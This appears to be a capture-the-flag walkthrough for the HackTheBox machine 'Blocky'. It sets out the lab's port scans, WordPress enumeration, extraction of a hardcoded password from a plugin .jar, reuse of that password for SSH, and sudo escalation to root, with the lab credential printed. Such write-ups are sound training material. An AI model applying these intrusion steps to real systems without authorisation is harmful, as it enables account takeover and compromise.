# Recon

First, all-tcp scan:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.10.37
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```

Detailed scan on found ports:
```bash
nmap -p 21,22,80,25565 -sVC -oA scans/nmap-tcpdetail 10.10.10.37
PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://blocky.htb
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Endpoint enumeration:
```bash
301      GET        9l       28w      313c http://blocky.htb/wp-content => http://blocky.htb/wp-content/
301      GET        9l       28w      314c http://blocky.htb/wp-includes => http://blocky.htb/wp-includes/
301      GET        9l       28w      311c http://blocky.htb/wp-admin => http://blocky.htb/wp-admin/
301      GET        9l       28w      310c http://blocky.htb/plugins => http://blocky.htb/plugins/
301      GET        9l       28w      313c http://blocky.htb/javascript => http://blocky.htb/javascript/
301      GET        9l       28w      307c http://blocky.htb/wiki => http://blocky.htb/wiki/
200      GET       31l       90w      683c http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js
200      GET      209l      846w     5836c http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
301      GET        9l       28w      313c http://blocky.htb/phpmyadmin => http://blocky.htb/phpmyadmin/
200      GET      225l      400w     3646c http://blocky.htb/wp-content/themes/twentyseventeen/assets/css/ie8.css
500      GET        0l        0w        0c http://blocky.htb/wp-content/themes/twentyseventeen/
200      GET        1l        9w     1398c http://blocky.htb/wp-includes/js/wp-embed.min.js
301      GET        0l        0w        0c http://blocky.htb/index.php/ => http://blocky.htb/
200      GET       43l       43w     1045c http://blocky.htb/wp-includes/wlwmanifest.xml
200      GET       70l      199w     2397c http://blocky.htb/wp-login.php
200      GET      249l      928w     7682c http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/global.js
405      GET        1l        6w       42c http://blocky.htb/xmlrpc.php
200      GET      326l     1144w    10330c http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/html5.js
200      GET        6l     1435w    97184c http://blocky.htb/wp-includes/js/jquery/jquery.js
200      GET        0l        0w    82584c http://blocky.htb/wp-content/themes/twentyseventeen/style.css
200      GET        0l        0w    10056c http://blocky.htb/wp-includes/js/jquery/jquery-migrate.min.js
200      GET        0l        0w        0c http://blocky.htb/index.php/wp-json
200      GET      313l     3592w    52227c http://blocky.htb/
```

Subdomain scan didn't yield any results

Since we are clearly dealing with WordPress site, we will run basic wpscan first:

```bash
sudo wpscan --url http://blocky.htb --enumerate

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <============================================================================> (619 / 619) 100.00% Time: 00:00:05
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:21 <==========================================================================> (2575 / 2575) 100.00% Time: 00:00:21

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <===================================================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <========================================================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

# Shell as Notch

We run a wordpress password attack against acquired username (notch),
but it didn't yield any results. After that, we went back to enumeration,
and discovered two .jar files that escaped our attention first:

```
200 GET 5l 19w 1362c http://blocky.htb/plugins/files/BlockyCore.jar
200 GET 0l 0w  532928c http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
```

After downloading both, we decompiled them in their respective directories:
```bash
jar xvf BlockyCore.jar
jar xvf griefprevention-1.11.2-3.1.1.298.jar
```

In BlockyCore we find BlockyCore.class, and after using strings on it, we are
able to see something that looks like a password:

```bash
strings BlockyCore.class
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
	localhost	
root	
8YsqfCTnvxAUeduzjNSXe22	
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart

..SNIP..
```

We first try it on wp-login page, and then on ftp, when it finally works.
After that we use it with username found by wpscan to ssh and acquire user flag.

```
notch:8YsqfCTnvxAUeduzjNSXe22
```

```
fca**************************778
```

# Shell as root

In this machine, shell root is very simple.
We run sudo -l:
```bash
sudo -l
[sudo] password for notch:
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Then we just run:

```bash
sudo su
```

With acquired root access, we can read the flag in root home directory.

```
60e**************************34e
```
